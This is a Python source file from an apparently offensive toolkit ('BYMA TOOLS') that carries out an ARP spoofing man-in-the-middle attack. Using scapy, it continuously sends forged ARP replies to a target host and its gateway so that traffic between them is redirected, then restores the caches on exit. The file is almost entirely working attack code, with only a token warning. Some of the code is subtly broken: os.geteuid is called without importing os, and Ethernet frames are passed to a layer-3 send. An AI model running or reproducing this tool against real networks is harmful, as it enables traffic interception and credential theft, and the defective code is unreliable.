"""
BYMA TOOLS - ARP Spoof
Tools untuk ARP spoofing attack
"""
import sys
import time
import threading
from pathlib import Path
from core.colors import (
    print_success, print_error, print_warning, print_info,
    print_result, print_section, cprint, Colors
)
from core.logger import get_logger


class ARPSpoof:
    """ARP spoofing tool"""
    
    def __init__(self):
        self.logger = get_logger()
        self.running = False
    
    def spoof(self, target_ip, gateway_ip, interface=None):
        """Main spoof function"""
        print_section(f"ARP Spoof: {target_ip}")
        
        print_warning("This tool requires root/administrator privileges!")
        print_warning("Use with caution and only on networks you own!")
        print()
        
        try:
            # Check if running as root
            if sys.platform != 'win32' and os.geteuid() != 0:
                print_error("This tool requires root privileges. Run with sudo.")
                return
            
            print_info(f"Target: {target_ip}")
            print_info(f"Gateway: {gateway_ip}")
            print()
            
            # Get MAC addresses
            print_info("Getting MAC addresses...")
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)
            
            if not target_mac:
                print_error(f"Could not get MAC address for {target_ip}")
                return
            
            if not gateway_mac:
                print_error(f"Could not get MAC address for {gateway_ip}")
                return
            
            print_success(f"Target MAC: {target_mac}")
            print_success(f"Gateway MAC: {gateway_mac}")
            print()
            
            # Start spoofing
            print_info("Starting ARP spoofing...")
            print_warning("Press Ctrl+C to stop and restore ARP tables")
            print()
            
            self.running = True
            
            # Start spoofing in separate threads
            target_thread = threading.Thread(
                target=self._spoof_target,
                args=(target_ip, target_mac, gateway_ip),
                daemon=True
            )
            gateway_thread = threading.Thread(
                target=self._spoof_gateway,
                args=(gateway_ip, gateway_mac, target_ip),
                daemon=True
            )
            
            target_thread.start()
            gateway_thread.start()
            
            # Wait for Ctrl+C
            while self.running:
                time.sleep(1)
        
        except KeyboardInterrupt:
            print()
            print_info("Stopping ARP spoofing...")
            self.running = False
            
            # Restore ARP tables
            print_info("Restoring ARP tables...")
            self._restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
            self._restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
            
            print_success("ARP tables restored")
        
        except Exception as e:
            print_error(f"ARP spoof failed: {e}")
            self.logger.error(f"ARP spoof failed: {e}")
    
    def _get_mac(self, ip):
        """Get MAC address of IP"""
        try:
            import subprocess
            if sys.platform == 'win32':
                # Windows
                result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if '-' in part and len(part) == 17:
                                return part.replace('-', ':')
            else:
                # Linux/Mac
                result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
        except:
            pass
        
        return None
    
    def _spoof_target(self, target_ip, target_mac, gateway_ip):
        """Spoof ARP replies to target"""
        try:
            from scapy.all import ARP, Ether, send
            
            while self.running:
                # Send spoofed ARP reply to target
                arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                ether = Ether(dst=target_mac)
                packet = ether / arp
                send(packet, verbose=False)
                time.sleep(2)
        except Exception as e:
            print_error(f"Target spoof thread error: {e}")
    
    def _spoof_gateway(self, gateway_ip, gateway_mac, target_ip):
        """Spoof ARP replies to gateway"""
        try:
            from scapy.all import ARP, Ether, send
            
            while self.running:
                # Send spoofed ARP reply to gateway
                arp = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                ether = Ether(dst=gateway_mac)
                packet = ether / arp
                send(packet, verbose=False)
                time.sleep(2)
        except Exception as e:
            print_error(f"Gateway spoof thread error: {e}")
    
    def _restore_arp(self, ip, mac, spoofed_ip, spoofed_mac):
        """Restore ARP tables"""
        try:
            from scapy.all import ARP, Ether, send
            
            # Send correct ARP reply
            arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
            ether = Ether(dst=mac)
            packet = ether / arp
            
            # Send multiple times to ensure restoration
            for _ in range(5):
                send(packet, verbose=False)
        except:
            pass
